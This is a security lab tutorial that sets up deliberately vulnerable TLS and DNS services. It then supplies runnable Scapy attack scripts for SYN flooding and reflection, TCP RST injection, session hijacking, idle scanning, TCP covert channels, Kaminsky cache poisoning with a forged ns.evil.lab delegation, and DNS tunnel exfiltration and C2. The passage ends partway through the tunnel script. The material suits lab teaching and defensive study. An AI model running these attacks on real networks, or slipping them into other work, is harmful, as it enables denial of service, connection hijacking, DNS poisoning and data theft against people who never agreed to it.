# Tutorial: TCP/IP, DNS, and TLS Security — Hands-On Lab

> **Domain 9, Chapter 9A** — Comprehensive offensive and defensive lab exercises covering TCP/IP stack attacks, DNS exploitation, TLS vulnerabilities, MITM techniques, network scanning, packet crafting, firewall evasion, protocol forensics, and detection engineering.

> **Prerequisite knowledge:** TCP/IP state machine, DNS resolution hierarchy, TLS handshake mechanics, basic packet capture analysis, Linux networking sysctls, Scapy fundamentals.

---

## Lab Environment Setup

### Network Topology

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Lab Network: 10.9.1.0/24                      │
│                                                                       │
│  ┌────────────┐    ┌────────────┐    ┌────────────┐    ┌──────────┐│
│  │   VM1      │    │   VM2      │    │   VM3      │    │   VM4    ││
│  │ Target/    │    │ Attacker/  │    │ Detection/ │    │ Forensics││
│  │ Services   │    │ Scanning   │    │ Monitoring │    │ Analysis ││
│  │ 10.9.1.10  │    │ 10.9.1.20  │    │ 10.9.1.30  │    │10.9.1.40││
│  └────────────┘    └────────────┘    └────────────┘    └──────────┘│
│        │                  │                  │                │      │
│  ┌─────┴──────────────────┴──────────────────┴────────────────┴─┐   │
│  │                    vSwitch (br0)                               │   │
│  └───────────────────────────────────────────────────────────────┘   │
│        │                                                              │
│  ┌─────┴──────────┐                                                  │
│  │   Router/GW    │                                                  │
│  │  10.9.1.1      │                                                  │
│  └────────────────┘                                                  │
└─────────────────────────────────────────────────────────────────────┘
```

### VM Specifications

| VM | Role | OS | RAM | Software |
|----|------|-----|-----|----------|
| VM1 | Target services | Ubuntu 22.04 | 4GB | Nginx, BIND9, Python3, OpenSSL, iodined |
| VM2 | Attacker/scanner | Kali 2024+ | 4GB | Scapy, Nmap, masscan, hping3, Bettercap, mitmproxy, dnscat2 |
| VM3 | Detection/IDS | Ubuntu 22.04 | 8GB | Suricata, Zeek, ELK Stack, Sigma |
| VM4 | Forensics/analysis | Ubuntu 22.04 | 4GB | tshark, Volatility3, Python3, mergecap |

### VM1 — Target Services Setup

```bash
#!/bin/bash
# vm1_setup.sh — Target services for network security lab

set -euo pipefail

apt-get update && apt-get install -y \
    nginx openssl bind9 bind9utils \
    python3 python3-pip python3-scapy \
    tcpdump ncat socat iproute2 \
    iptables nftables conntrack

# ─── Web server (TLS lab target) ───
mkdir -p /etc/nginx/ssl
openssl req -x509 -newkey rsa:2048 -keyout /etc/nginx/ssl/lab.key \
    -out /etc/nginx/ssl/lab.crt -days 365 -nodes \
    -subj "/CN=lab.target.local"

# Generate a weak DH parameters file (for Logjam testing)
openssl dhparam -out /etc/nginx/ssl/weak_dh.pem 512

cat > /etc/nginx/sites-available/tls-lab <<'EOF'
# Intentionally vulnerable TLS configurations for testing

# Modern TLS 1.3 only (secure baseline)
server {
    listen 443 ssl;
    server_name secure.lab.local;
    ssl_protocols TLSv1.3;
    ssl_certificate /etc/nginx/ssl/lab.crt;
    ssl_certificate_key /etc/nginx/ssl/lab.key;
    ssl_session_tickets off;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    root /var/www/html;
}

# Vulnerable: TLS 1.0/1.1/1.2 with weak ciphers (for attack demos)
server {
    listen 4430 ssl;
    server_name vuln.lab.local;
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
    ssl_ciphers 'ALL:!aNULL:!eNULL:@STRENGTH';
    ssl_certificate /etc/nginx/ssl/lab.crt;
    ssl_certificate_key /etc/nginx/ssl/lab.key;
    ssl_dhparam /etc/nginx/ssl/weak_dh.pem;
    root /var/www/html;
}

# HTTP only (SSL stripping target)
server {
    listen 80;
    server_name http.lab.local;
    location / {
        return 301 https://secure.lab.local$request_uri;
    }
}

# TLS with 0-RTT enabled (replay demo)
server {
    listen 4431 ssl;
    server_name earlydata.lab.local;
    ssl_protocols TLSv1.3;
    ssl_early_data on;
    ssl_certificate /etc/nginx/ssl/lab.crt;
    ssl_certificate_key /etc/nginx/ssl/lab.key;
    proxy_set_header Early-Data $ssl_early_data;
    root /var/www/html;
    location /api/transfer {
        # Simulates a state-changing endpoint vulnerable to 0-RTT replay
        default_type application/json;
        return 200 '{"status":"transfer_executed","amount":100}';
    }
}
EOF

ln -sf /etc/nginx/sites-available/tls-lab /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx

# ─── DNS server (BIND9 — intentionally misconfigured for lab) ───
cat > /etc/bind/named.conf.options <<'EOF'
options {
    directory "/var/cache/bind";
    recursion yes;
    allow-recursion { any; };       // Open recursion (vuln: amplification)
    allow-query { any; };
    dnssec-validation auto;
    listen-on { any; };
    listen-on-v6 { any; };
    // No rate limiting (vuln: amplification)
    // No source port randomization enforcement beyond OS defaults
};
EOF

cat > /etc/bind/named.conf.local <<'EOF'
zone "target.lab" {
    type master;
    file "/etc/bind/db.target.lab";
};

zone "signed.lab" {
    type master;
    file "/etc/bind/db.signed.lab.signed";
    dnssec-policy default;
    inline-signing yes;
};
EOF

cat > /etc/bind/db.target.lab <<'EOF'
$TTL    300
@       IN      SOA     ns1.target.lab. admin.target.lab. (
                        2024010101 ; serial
                        3600       ; refresh
                        900        ; retry
                        604800     ; expire
                        86400 )    ; minimum
@       IN      NS      ns1.target.lab.
@       IN      A       10.9.1.10
ns1     IN      A       10.9.1.10
www     IN      A       10.9.1.10
mail    IN      A       10.9.1.10
internal IN     A       192.168.1.100
secret  IN      TXT     "API_KEY=sk_live_FAKE_KEY_12345"
EOF

named-checkconf && systemctl restart bind9

# ─── TCP services for attack demos ───
# Simple TCP echo server (for session hijacking demo)
cat > /opt/tcp_echo_server.py <<'PYEOF'
#!/usr/bin/env python3
"""Simple TCP echo server for demonstrating TCP attacks."""
import socket
import threading

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            conn.sendall(b"ECHO: " + data)
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        conn.close()
        print(f"[-] Disconnected: {addr}")

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 9999))
    srv.listen(128)
    print("[*] TCP Echo server on :9999")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
PYEOF
chmod +x /opt/tcp_echo_server.py

# Long-lived TCP connection simulator (for RST injection demo)
cat > /opt/tcp_persistent_conn.py <<'PYEOF'
#!/usr/bin/env python3
"""Simulates a long-lived TCP connection (like BGP) for RST injection demos."""
import socket
import time

def server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 17900))
    srv.listen(1)
    print("[*] Persistent connection server on :17900")
    conn, addr = srv.accept()
    print(f"[+] Persistent session with {addr}")
    try:
        while True:
            conn.sendall(b"KEEPALIVE\n")
            time.sleep(5)
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        print(f"[!] Connection terminated: {e}")
    finally:
        conn.close()

if __name__ == "__main__":
    server()
PYEOF
chmod +x /opt/tcp_persistent_conn.py

# ─── Vulnerable kernel parameters (for educational SYN flood testing) ───
cat > /opt/set_vuln_tcp_params.sh <<'EOF'
#!/bin/bash
# Set intentionally weak TCP parameters for lab demonstration
sysctl -w net.ipv4.tcp_syncookies=0           # Disable SYN cookies
sysctl -w net.ipv4.tcp_max_syn_backlog=128    # Small backlog
sysctl -w net.core.somaxconn=128              # Small listen queue
sysctl -w net.ipv4.tcp_synack_retries=5       # Default retries
sysctl -w net.ipv4.tcp_timestamps=1           # Timestamps enabled (info leak)
sysctl -w net.ipv4.conf.all.accept_redirects=1  # Accept ICMP redirects
sysctl -w net.ipv4.tcp_challenge_ack_limit=100  # Low challenge ACK limit (CVE-2016-5696)
echo "[*] Vulnerable TCP parameters set"
EOF
chmod +x /opt/set_vuln_tcp_params.sh

# ─── DNS tunneling receiver (iodine) ───
cat > /opt/start_dns_tunnel_server.sh <<'EOF'
#!/bin/bash
# Start iodine DNS tunnel server (for tunnel detection exercises)
iodined -f -c -P labpassword123 10.53.0.1/24 tunnel.target.lab &
echo "[*] iodine DNS tunnel server started on tunnel.target.lab"
EOF
chmod +x /opt/start_dns_tunnel_server.sh

echo "[✓] VM1 target services configured"
```

### VM2 — Attacker/Scanner Setup

```bash
#!/bin/bash
# vm2_setup.sh — Attacker and scanning tools

set -euo pipefail

apt-get update && apt-get install -y \
    python3 python3-pip python3-scapy \
    nmap masscan zmap hping3 \
    bettercap mitmproxy \
    iodine dnscat2 dns2tcp \
    wireshark-common tshark tcpdump \
    curl wget openssl netcat-openbsd socat \
    nftables iptables fragroute \
    ruby golang-go git

pip3 install scapy dnspython cryptography requests

# ─── Custom attack scripts ───
mkdir -p /opt/attacks/{tcp,dns,tls,mitm,scan,evasion}

# === TCP Attack Scripts ===

cat > /opt/attacks/tcp/syn_flood.py <<'PYEOF'
#!/usr/bin/env python3
"""
SYN Flood demonstration — educational purposes only.
Requires root/CAP_NET_RAW.
"""
import sys
import random
from scapy.all import IP, TCP, send, RandShort, RandIP

def syn_flood(target_ip: str, target_port: int, count: int = 1000, verbose: bool = True):
    """Send spoofed SYN packets to exhaust target's SYN backlog."""
    print(f"[*] SYN flood → {target_ip}:{target_port} ({count} packets)")
    
    packets_sent = 0
    for i in range(count):
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 2**32 - 1)
        
        pkt = IP(src=src_ip, dst=target_ip) / \
              TCP(sport=src_port, dport=target_port, flags="S", seq=seq_num,
                  options=[("MSS", 1460), ("WScale", 7)])
        send(pkt, verbose=0)
        packets_sent += 1
        
        if verbose and packets_sent % 100 == 0:
            print(f"    [{packets_sent}/{count}] packets sent")
    
    print(f"[+] SYN flood complete: {packets_sent} packets sent")

def syn_flood_amplified(target_ip: str, reflector_ips: list, target_port: int = 80):
    """SYN-ACK reflection — send SYNs with victim's IP as source to reflectors."""
    print(f"[*] SYN-ACK reflection → {target_ip} via {len(reflector_ips)} reflectors")
    for reflector in reflector_ips:
        for port in [80, 443, 22, 25]:
            pkt = IP(src=target_ip, dst=reflector) / \
                  TCP(sport=random.randint(1024, 65535), dport=port, flags="S",
                      seq=random.randint(0, 2**32 - 1))
            send(pkt, verbose=0)
    print("[+] Reflection SYNs sent — reflectors will send SYN-ACKs to victim")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> [count]")
        sys.exit(1)
    target = sys.argv[1]
    port = int(sys.argv[2])
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 500
    syn_flood(target, port, count)
PYEOF

cat > /opt/attacks/tcp/rst_injection.py <<'PYEOF'
#!/usr/bin/env python3
"""
TCP RST injection — terminate an active TCP connection.
Demonstrates the attack from CVE-2016-5696 and GFW-style censorship.
"""
import sys
import time
from scapy.all import IP, TCP, send, sniff, Raw

def sniff_and_inject_rst(target_ip: str, target_port: int, interface: str = "eth0"):
    """
    Sniff an active connection, then inject a RST with a valid sequence number.
    On-path attack: attacker can observe the connection.
    """
    print(f"[*] Sniffing for active connection to {target_ip}:{target_port}...")
    
    def inject_rst(pkt):
        if pkt.haslayer(TCP) and pkt[IP].dst == target_ip and pkt[TCP].dport == target_port:
            # Use the ACK number from a captured packet as our RST sequence
            rst_seq = pkt[TCP].ack
            src_ip = pkt[IP].src
            src_port = pkt[TCP].sport
            
            print(f"[+] Captured: {src_ip}:{src_port} → {target_ip}:{target_port}")
            print(f"    Injecting RST with seq={rst_seq:#x}")
            
            # Inject RST spoofing the client
            rst_pkt = IP(src=src_ip, dst=target_ip) / \
                      TCP(sport=src_port, dport=target_port, flags="R", seq=rst_seq)
            send(rst_pkt, verbose=0)
            
            # Also inject RST to the client (spoofing server) for full teardown
            resp_rst = IP(src=target_ip, dst=src_ip) / \
                       TCP(sport=target_port, dport=src_port, flags="R", seq=pkt[TCP].seq)
            send(resp_rst, verbose=0)
            
            print("[+] RST injected to both endpoints — connection terminated")
            return True
    
    sniff(filter=f"tcp and host {target_ip} and port {target_port}",
          prn=inject_rst, count=1, iface=interface)

def blind_rst_bruteforce(target_ip: str, target_port: int, spoofed_src: str,
                          spoofed_sport: int, window_size: int = 65535):
    """
    Blind RST injection: brute-force the sequence number space.
    Success probability per packet: window_size / 2^32
    With window scaling factor 7: effective window = 65535 * 128 = 8MB
    Probability per RST: 8388608 / 4294967296 ≈ 0.2%
    Need ~500 RSTs across the 4GB sequence space to have high confidence.
    """
    print(f"[*] Blind RST brute-force: {spoofed_src}:{spoofed_sport} → {target_ip}:{target_port}")
    print(f"    Window assumption: {window_size} bytes, Step: {window_size}")
    
    seq = 0
    packets_sent = 0
    total_needed = (2**32) // window_size
    
    print(f"    Total packets needed to cover sequence space: {total_needed}")
    
    while seq < 2**32:
        pkt = IP(src=spoofed_src, dst=target_ip) / \
              TCP(sport=spoofed_sport, dport=target_port, flags="R", seq=seq)
        send(pkt, verbose=0)
        seq += window_size
        packets_sent += 1
        
        if packets_sent % 1000 == 0:
            print(f"    [{packets_sent}/{total_needed}] seq={seq:#010x}")
        
        if packets_sent >= 10000:
            print("[*] Demo limit reached (10000 packets)")
            break
    
    print(f"[+] Sent {packets_sent} RST packets")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} sniff <target_ip> <target_port>")
        print(f"       {sys.argv[0]} blind <target_ip> <target_port> <spoofed_src> <spoofed_sport>")
        sys.exit(1)
    
    mode = sys.argv[1]
    if mode == "sniff":
        sniff_and_inject_rst(sys.argv[2], int(sys.argv[3]))
    elif mode == "blind":
        blind_rst_bruteforce(sys.argv[2], int(sys.argv[3]), sys.argv[4], int(sys.argv[5]))
PYEOF

cat > /opt/attacks/tcp/session_hijack.py <<'PYEOF'
#!/usr/bin/env python3
"""
TCP session hijacking via desynchronization.
On-path attacker injects data into an established TCP stream.
"""
import sys
from scapy.all import IP, TCP, Raw, send, sniff

def hijack_tcp_session(target_ip: str, target_port: int, payload: bytes,
                       interface: str = "eth0"):
    """
    Wait for a PSH-ACK packet, then inject data as the client.
    The injected data uses the client's current sequence number (from server's ACK).
    """
    print(f"[*] Waiting for active session to {target_ip}:{target_port}...")
    
    def do_hijack(pkt):
        if not pkt.haslayer(TCP):
            return
        if pkt[TCP].flags != 0x18:  # PSH-ACK
            return
        if pkt[IP].src != target_ip:
            return
        
        # Packet from server → client
        # We'll inject as the client (spoofing client's IP)
        client_ip = pkt[IP].dst
        client_port = pkt[TCP].dport
        
        # Our injected seq = server's ACK (what the server expects next from client)
        inject_seq = pkt[TCP].ack
        # Our ACK = server's seq + payload length
        inject_ack = pkt[TCP].seq + len(pkt[TCP].payload)
        
        print(f"[+] Hijacking: {client_ip}:{client_port} → {target_ip}:{target_port}")
        print(f"    inject_seq={inject_seq:#x}, inject_ack={inject_ack:#x}")
        print(f"    Payload: {payload[:50]}...")
        
        inject_pkt = IP(src=client_ip, dst=target_ip) / \
                     TCP(sport=client_port, dport=target_port,
                         seq=inject_seq, ack=inject_ack, flags="PA") / \
                     Raw(load=payload)
        send(inject_pkt, verbose=0)
        print("[+] Injected! Server will process our data in client's context")
        return True
    
    sniff(filter=f"tcp and host {target_ip} and port {target_port}",
          prn=do_hijack, count=1, iface=interface)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> [payload]")
        sys.exit(1)
    payload = sys.argv[3].encode() if len(sys.argv) > 3 else b"HIJACKED_DATA\n"
    hijack_tcp_session(sys.argv[1], int(sys.argv[2]), payload)
PYEOF

cat > /opt/attacks/tcp/idle_scan.py <<'PYEOF'
#!/usr/bin/env python3
"""
Idle scan (zombie scan) implementation.
Uses a third-party zombie host's IPID to scan without revealing scanner's IP.
"""
import sys
import time
from scapy.all import IP, TCP, sr1, send

def get_ipid(zombie_ip: str, zombie_port: int = 80) -> int:
    """Probe zombie's current IPID by sending SYN-ACK (elicits RST with IPID)."""
    probe = IP(dst=zombie_ip) / TCP(dport=zombie_port, flags="SA")
    resp = sr1(probe, timeout=2, verbose=0)
    if resp and resp.haslayer(IP):
        return resp[IP].id
    return -1

def idle_scan_port(zombie_ip: str, target_ip: str, target_port: int,
                   zombie_port: int = 80) -> str:
    """
    Scan a single port using the idle scan technique.
    Returns: "open", "closed|filtered", or "error"
    """
    # Step 1: Get zombie's current IPID
    ipid1 = get_ipid(zombie_ip, zombie_port)
    if ipid1 == -1:
        return "error (zombie not responding)"
    
    # Step 2: Send spoofed SYN from zombie's IP to target
    spoofed_syn = IP(src=zombie_ip, dst=target_ip) / \
                  TCP(sport=zombie_port + 1, dport=target_port, flags="S")
    send(spoofed_syn, verbose=0)
    
    # Wait for the SYN-ACK → RST exchange to complete
    time.sleep(1.5)
    
    # Step 3: Probe zombie's IPID again
    ipid2 = get_ipid(zombie_ip, zombie_port)
    if ipid2 == -1:
        return "error (zombie stopped responding)"
    
    # Step 4: Analyze IPID increment
    increment = ipid2 - ipid1
    if increment == 2:
        return "open"       # Target sent SYN-ACK → zombie sent RST (IPID +1 from our probe, +1 from RST)
    elif increment == 1:
        return "closed|filtered"  # Target sent RST → zombie ignored it; only our probe incremented IPID
    else:
        return f"indeterminate (IPID delta={increment}, zombie too noisy?)"

def scan_range(zombie_ip: str, target_ip: str, ports: list):
    """Scan multiple ports using idle scan."""
    print(f"[*] Idle scan: zombie={zombie_ip} target={target_ip}")
    print(f"    Scanning {len(ports)} ports...\n")
    
    # Verify zombie has incremental IPID
    ipid_a = get_ipid(zombie_ip)
    time.sleep(0.5)
    ipid_b = get_ipid(zombie_ip)
    if ipid_b - ipid_a != 1:
        print(f"[!] Warning: zombie IPID not strictly incremental (delta={ipid_b-ipid_a})")
        print("    Results may be unreliable.\n")
    
    results = {}
    for port in ports:
        result = idle_scan_port(zombie_ip, target_ip, port)
        results[port] = result
        status_char = "●" if result == "open" else "○"
        print(f"    {status_char} Port {port:>5}: {result}")
        time.sleep(0.5)  # Avoid flooding zombie
    
    open_ports = [p for p, r in results.items() if r == "open"]
    print(f"\n[+] Open ports: {open_ports if open_ports else 'none found'}")
    return results

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <zombie_ip> <target_ip> <ports>")
        print(f"  ports: comma-separated (22,80,443) or range (1-1024)")
        sys.exit(1)
    
    zombie = sys.argv[1]
    target = sys.argv[2]
    port_spec = sys.argv[3]
    
    if "-" in port_spec:
        start, end = port_spec.split("-")
        ports = list(range(int(start), int(end) + 1))
    else:
        ports = [int(p) for p in port_spec.split(",")]
    
    scan_range(zombie, target, ports)
PYEOF

cat > /opt/attacks/tcp/covert_channel.py <<'PYEOF'
#!/usr/bin/env python3
"""
TCP covert channels — hide data in protocol fields.
Implements ISN, urgent pointer, and TCP options covert channels.
"""
import sys
import struct
import time
from scapy.all import IP, TCP, send, sniff, Raw

class ISNCovertChannel:
    """Encode data in the TCP Initial Sequence Number field (32 bits per SYN)."""
    
    def __init__(self, dst_ip: str, dst_port: int):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
    
    def send_message(self, message: bytes, src_port_base: int = 40000):
        """Encode message into ISN fields of SYN packets."""
        print(f"[*] ISN covert channel: sending {len(message)} bytes to {self.dst_ip}:{self.dst_port}")
        
        # Pad message to 4-byte alignment
        padded = message + b'\x00' * (4 - len(message) % 4) if len(message) % 4 else message
        
        for i in range(0, len(padded), 4):
            chunk = padded[i:i+4]
            isn = struct.unpack("!I", chunk)[0]
            sport = src_port_base + (i // 4)
            
            pkt = IP(dst=self.dst_ip) / TCP(sport=sport, dport=self.dst_port,
                                            flags="S", seq=isn)
            send(pkt, verbose=0)
            time.sleep(0.1)
        
        # Send FIN as end-of-message marker (ISN = length)
        end_pkt = IP(dst=self.dst_ip) / TCP(sport=src_port_base + len(padded)//4,
                                             dport=self.dst_port, flags="F",
                                             seq=len(message))
        send(end_pkt, verbose=0)
        print(f"[+] Sent {len(padded)//4 + 1} packets ({len(message)} payload bytes)")
    
    @staticmethod
    def receive(interface: str = "eth0", listen_port: int = 8888, timeout: int = 30):
        """Receive and decode ISN covert channel."""
        print(f"[*] Listening for ISN covert channel on port {listen_port}...")
        
        collected_isns = []
        msg_len = None
        
        def extract_isn(pkt):
            nonlocal msg_len
            if pkt.haslayer(TCP) and pkt[TCP].dport == listen_port:
                if pkt[TCP].flags == 0x02:  # SYN
                    collected_isns.append(pkt[TCP].seq)
                elif pkt[TCP].flags == 0x01:  # FIN (end marker)
                    msg_len = pkt[TCP].seq
                    return True
        
        sniff(filter=f"tcp dst port {listen_port}", prn=extract_isn,
              timeout=timeout, iface=interface, stop_filter=lambda p: msg_len is not None)
        
        if not collected_isns:
            print("[-] No data received")
            return b""
        
        # Reconstruct message from ISNs
        raw = b"".join(struct.pack("!I", isn) for isn in collected_isns)
        if msg_len:
            raw = raw[:msg_len]
        
        print(f"[+] Received {len(collected_isns)} chunks → {len(raw)} bytes")
        print(f"    Message: {raw}")
        return raw


class TCPOptionCovertChannel:
    """Encode data in unused TCP option fields (kind 19-26 are unassigned)."""
    
    def __init__(self, dst_ip: str, dst_port: int, option_kind: int = 19):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.option_kind = option_kind  # Unassigned TCP option kind
    
    def send_message(self, message: bytes):
        """Encode data as custom TCP options (up to 38 bytes per packet)."""
        print(f"[*] TCP option covert channel (kind={self.option_kind})")
        
        max_chunk = 38  # TCP options field max 40 bytes - 2 bytes for kind+length
        chunks = [message[i:i+max_chunk] for i in range(0, len(message), max_chunk)]
        
        for idx, chunk in enumerate(chunks):
            # Custom TCP option: (kind, length, data)
            opt = (self.option_kind, 2 + len(chunk), chunk)
            pkt = IP(dst=self.dst_ip) / TCP(sport=50000 + idx, dport=self.dst_port,
                                            flags="S", options=[opt])
            send(pkt, verbose=0)
            time.sleep(0.05)
        
        print(f"[+] Sent {len(chunks)} packets with covert data in TCP options")


class UrgentPointerChannel:
    """Encode 16 bits per packet in the TCP urgent pointer field (URG flag = 0)."""
    
    def __init__(self, dst_ip: str, dst_port: int):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
    
    def send_message(self, message: bytes):
        """2 bytes per packet via urgent pointer."""
        print(f"[*] Urgent pointer covert channel → {self.dst_ip}:{self.dst_port}")
        
        padded = message + b'\x00' if len(message) % 2 else message
        
        for i in range(0, len(padded), 2):
            urg_val = struct.unpack("!H", padded[i:i+2])[0]
            # Note: URG flag is NOT set, but urgptr field carries data
            pkt = IP(dst=self.dst_ip) / TCP(sport=60000 + i//2, dport=self.dst_port,
                                            flags="S", urgptr=urg_val)
            send(pkt, verbose=0)
            time.sleep(0.05)
        
        print(f"[+] Sent {len(padded)//2} packets (urgent pointer covert)")


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <method> <action> <ip> [port] [message]")
        print("  Methods: isn, option, urgptr")
        print("  Actions: send, recv")
        print(f"  Example: {sys.argv[0]} isn send 10.9.1.10 8888 'SECRET DATA'")
        sys.exit(1)
    
    method = sys.argv[1]
    action = sys.argv[2]
    target = sys.argv[3]
    port = int(sys.argv[4]) if len(sys.argv) > 4 else 8888
    msg = sys.argv[5].encode() if len(sys.argv) > 5 else b"COVERT_TEST"
    
    if method == "isn":
        ch = ISNCovertChannel(target, port)
        if action == "send":
            ch.send_message(msg)
        elif action == "recv":
            ISNCovertChannel.receive(listen_port=port)
    elif method == "option":
        ch = TCPOptionCovertChannel(target, port)
        ch.send_message(msg)
    elif method == "urgptr":
        ch = UrgentPointerChannel(target, port)
        ch.send_message(msg)
PYEOF

# === DNS Attack Scripts ===

cat > /opt/attacks/dns/kaminsky_demo.py <<'PYEOF'
#!/usr/bin/env python3
"""
Kaminsky DNS cache poisoning — demonstration.
Triggers queries for random subdomains and races to respond before the real NS.
"""
import sys
import random
import string
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sr1

def kaminsky_attack(resolver_ip: str, target_domain: str, attacker_ns_ip: str,
                    auth_ns_ip: str, attempts: int = 100, txid_samples: int = 256):
    """
    Kaminsky-style DNS cache poisoning.
    
    Strategy:
    1. Query resolver for random_subdomain.target_domain (triggers upstream query)
    2. Race with forged responses containing delegation to attacker's NS
    3. Must guess: TXID (16 bits) and resolver's source port (16 bits)
       With source port randomization: ~32 bits to guess = very hard
       Without: only 16-bit TXID = feasible with ~birthday-bound attempts
    """
    print(f"[*] Kaminsky attack against {resolver_ip}")
    print(f"    Target domain: {target_domain}")
    print(f"    Attacker NS: ns.evil.lab → {attacker_ns_ip}")
    print(f"    Auth NS IP (spoofed source): {auth_ns_ip}")
    print(f"    Attempts: {attempts}, TXID samples per attempt: {txid_samples}\n")
    
    for attempt in range(attempts):
        # Generate random subdomain to bypass cache
        random_sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        query_name = f"{random_sub}.{target_domain}"
        
        # Step 1: Trigger resolver to query upstream
        trigger = IP(dst=resolver_ip) / UDP(dport=53) / \
                  DNS(rd=1, qd=DNSQR(qname=query_name, qtype="A"))
        send(trigger, verbose=0)
        
        # Step 2: Flood forged responses (race condition)
        for txid_offset in range(txid_samples):
            txid = random.randint(0, 65535)
            # Guess a common source port range (many resolvers use 1024-65535)
            guessed_sport = random.randint(1024, 65535)
            
            forged = IP(src=auth_ns_ip, dst=resolver_ip) / \
                     UDP(sport=53, dport=guessed_sport) / \
                     DNS(id=txid, qr=1, aa=1, rd=1, ra=1,
                         qd=DNSQR(qname=query_name, qtype="A"),
                         an=DNSRR(rrname=query_name, type="A",
                                  rdata=attacker_ns_ip, ttl=86400),
                         ns=DNSRR(rrname=target_domain, type="NS",
                                  rdata=f"ns.evil.lab", ttl=86400),
                         ar=DNSRR(rrname="ns.evil.lab", type="A",
                                  rdata=attacker_ns_ip, ttl=86400))
            send(forged, verbose=0)
        
        if (attempt + 1) % 10 == 0:
            print(f"    Attempt {attempt+1}/{attempts} (subdomain: {random_sub})")
            # Check if poisoning succeeded
            check = sr1(IP(dst=resolver_ip) / UDP(dport=53) /
                       DNS(rd=1, qd=DNSQR(qname=target_domain, qtype="NS")),
                       timeout=2, verbose=0)
            if check and check.haslayer(DNS):
                for i in range(check[DNS].ancount):
                    rr = check[DNS].an[i] if hasattr(check[DNS].an, '__getitem__') else check[DNS].an
                    if hasattr(rr, 'rdata') and b'evil' in bytes(str(rr.rdata), 'utf-8', errors='ignore'):
                        print(f"\n[!!!] POISONING SUCCESSFUL! Resolver cached evil NS!")
                        print(f"      {target_domain} NS → ns.evil.lab")
                        return True
    
    print(f"\n[-] Poisoning failed after {attempts} attempts")
    print("    (Expected — source port randomization makes this ~2^32 guesses)")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <resolver_ip> <target_domain> <attacker_ns_ip> <auth_ns_ip> [attempts]")
        sys.exit(1)
    
    attempts = int(sys.argv[5]) if len(sys.argv) > 5 else 50
    kaminsky_attack(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], attempts)
PYEOF

cat > /opt/attacks/dns/dns_tunnel_client.py <<'PYEOF'
#!/usr/bin/env python3
"""
DNS tunneling exfiltration — encode data in DNS query labels.
Demonstrates base32-encoded data exfiltration via DNS TXT queries.
"""
import sys
import base64
import time
from scapy.all import IP, UDP, DNS, DNSQR, sr1

def exfiltrate_via_dns(data: bytes, tunnel_domain: str, resolver: str,
                       chunk_size: int = 30):
    """
    Exfiltrate data by encoding it in DNS query subdomains.
    Each label max 63 chars, total query max 253 chars.
    Using base32: 30 raw bytes → 48 base32 chars per label.
    """
    encoded = base64.b32encode(data).decode().rstrip('=').lower()
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    print(f"[*] DNS exfiltration: {len(data)} bytes → {len(chunks)} queries")
    print(f"    Tunnel domain: {tunnel_domain}")
    print(f"    Resolver: {resolver}\n")
    
    for idx, chunk in enumerate(chunks):
        # Format: <seq>.<chunk>.tunnel_domain
        query = f"{idx:04d}.{chunk}.{tunnel_domain}"
        
        pkt = IP(dst=resolver) / UDP(dport=53) / \
              DNS(rd=1, qd=DNSQR(qname=query, qtype="TXT"))
        resp = sr1(pkt, timeout=2, verbose=0)
        
        status = "OK" if resp else "TIMEOUT"
        print(f"    [{idx+1:>3}/{len(chunks)}] {query[:50]}... → {status}")
        time.sleep(0.1)
    
    print(f"\n[+] Exfiltration complete: {len(chunks)} DNS queries sent")

def interactive_c2(tunnel_domain: str, resolver: str):
    """Simulate DNS-based C2: send commands via TXT queries, receive via TXT responses."""
    print(f"[*] DNS C2 shell (domain: {tunnel_domain}, resolver: {resolver})")
    print("    Type commands. 'exit' to quit.\n")
    
    while True:
        cmd = input("dns-c2> ").strip()
        if cmd == "exit":
            break
        
        # Encode command in subdomain
        encoded_cmd = base64.b32encode(cmd.encode()).decode().rstrip('=').lower()
        query = f"cmd.{encoded_cmd}.{tunnel_domain}"
        
        pkt = IP(dst=resolver) / UDP(dport=53) / \
              DNS(rd=1, qd=DNSQR(qname=query, qtype="TXT"))
        resp = sr1(pkt, timeout=5, verbose=0)
        
        if resp and resp.haslayer(DNS) and resp[DNS].ancount > 0:
            # Decode response from TXT record
            txt_data = resp[DNS].an.rdata
            print(f"  → {txt_data}")
        else:
            print("  → [no response]")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} exfil <data_file> <tunnel_domain> <resolver>")
